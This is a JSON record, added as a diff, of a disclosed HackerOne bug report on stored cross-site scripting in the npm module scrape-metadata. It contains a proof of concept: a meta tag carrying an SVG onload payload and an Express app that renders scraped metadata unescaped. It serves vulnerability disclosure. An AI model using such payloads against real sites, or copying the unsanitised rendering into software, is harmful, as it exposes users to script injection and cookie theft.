@@ -1,0 +1,117 @@
+{
+  "id": 369573,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjk1NzM=",
+  "url": "https://hackerone.com/reports/369573",
+  "title": "stored xss in scrape-metadata when reading metadata from an html page",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "high",
+  "readable_substate": "Informative",
+  "created_at": "2018-06-21T15:16:13.694Z",
+  "submitted_at": "2018-06-21T15:16:13.694Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "johnssimon007",
+    "url": "/johnssimon007",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/NWPHHm8hwLotSetPuMmFkHCa/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-07-27T11:25:18.117Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-07-27T11:16:52.919Z",
+  "team_member_agreed_on_going_public_at": "2018-07-27T11:25:17.954Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hy\n\n# Module\nscrape-metadata\nhttps://www.npmjs.com/package/scrape-metadata\n\n## Module Description\na module used to scrape meta data contents from an article\n\n## Vulnerability Description\nIt was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.\n\n## Steps To Reproduce:\ncreate a website, I used a local server available at http://127.0.0.1:8080\nBelow is html file with js code injected in 'og:title property' and i uploaded the file to my\nremote server http://pokegen.in/test.html\n\n<!doctype html>\n<html xmlns:og=\"http://ogp.me/ns#\" lang=\"en\">\n\n<head>\n    <meta charset=\"utf8\">\n    <title>scrap-meta</title>\n\n    <meta property=\"og:description\" content=\"hackerone\">\n    <meta property=\"og:image\" content=\"image\">\n    <meta property=\"og:title\" content='https://google.com<svg/onload=prompt(1)>'>\n    <meta property=\"og:type\" content=\"article\">\n</head>\n<body>\n</body>\n</html>\n\ninstall scrape-metadata\nnpm install scrape-metadata\n\nconst http=require('http');\nconst server=http.createServer();\nconst express=require('express');\nconst app=express();\nconst scrape = require('scrape-metadata')\nvar url = \"http://pokegen.in/test.html\";\napp.get('/scrap', function(req, res) {\nscrape(url, (err, meta) => {\n    console.log(meta)\n      let __html = `\n               <div>\n                   <p>site title:${JSON.stringify(meta)}</p>\n               </div>\n           `\n           res.send(__html)\n  });\n\n});\n\napp.listen(8080)\n\nsave this as scrap.js\nnow run the app,node scrap.js\nnow goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt\n\nSupporting Material/References:\n\nConfiguration I've used to find this vulnerability:\nwindows 7\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\n# Wrap up\n If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\njohns simon\n\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nThis might lead to stealing session cookies from infected website, and much more sophisticated attacks",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 5,
+  "voters": [
+    "sameerphad72",
+    "bl4de",
+    "apapedulimu",
+    "johnssimon007",
+    "cryptographer"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 11573,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "scrape-metadata",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
